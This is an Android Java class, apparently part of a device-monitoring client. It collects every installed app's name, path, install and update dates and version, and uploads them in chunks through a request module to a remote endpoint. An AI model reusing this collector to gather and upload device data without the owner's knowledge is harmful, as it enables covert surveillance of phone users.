package com.inet.android.archive;

import java.util.Date;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;

import com.inet.android.request.DataRequest;
import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.Logging;

@SuppressLint("NewApi")
public class ListApp {
	Context mContext;
	private String iType = "7";
	static SharedPreferences sp;
	private String sendStr = null;
	private String complete;
	private static String LOG_TAG = "ListApp";
	Editor ed;
	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.mContext = context;
		sp = PreferenceManager.getDefaultSharedPreferences(context);
		// -------initial json line----------------------
		JSONObject jsonAppList = new JSONObject();
		JSONObject jsonInfo = new JSONObject();
		
		PackageManager packageManager = context.getPackageManager();
		final List<ApplicationInfo> installedApps = packageManager
				.getInstalledApplications(PackageManager.GET_META_DATA);
		for (ApplicationInfo app : installedApps) {

			try {
				PackageInfo packageInfo = packageManager.getPackageInfo(
						app.packageName, PackageManager.GET_PERMISSIONS);

				Date installTime = new Date(packageInfo.firstInstallTime);
				Date updateTime = new Date(packageInfo.lastUpdateTime);
				jsonAppList.put("name", app.packageName);
				jsonInfo.put("Directory: ", app.sourceDir);
				jsonInfo.put("Installed: ", installTime.toString());
				jsonInfo.put("Updated: ", updateTime.toString());
				jsonInfo.put("Version: ", packageInfo.versionCode);
				jsonInfo.put("Name: ", packageInfo.versionName);
				jsonAppList.put("info", jsonInfo);
					
				if (sendStr == null)
					sendStr = jsonAppList.toString();
				else
					sendStr += "," + jsonAppList.toString();
				if (sendStr.length() >= 10000) {
					Logging.doLog(LOG_TAG, "str >= 10000 .." + sendStr, "str >= 10000 .." + sendStr);
					complete = "0";
					sendRequest(sendStr, complete);
					sendStr = null;
				}
			} catch (PackageManager.NameNotFoundException e) {
				e.printStackTrace();
			} catch (JSONException e) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
			}
		}
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 .." + sendStr, "Send complete 1 .." + sendStr);
		sendRequest(sendStr, complete);
		sendStr = null;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();
		ed.putString("statusAppList", "0");
		ed.commit();
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
			// Logging.doLog(LOG_TAG, str, str);
		}
	}
}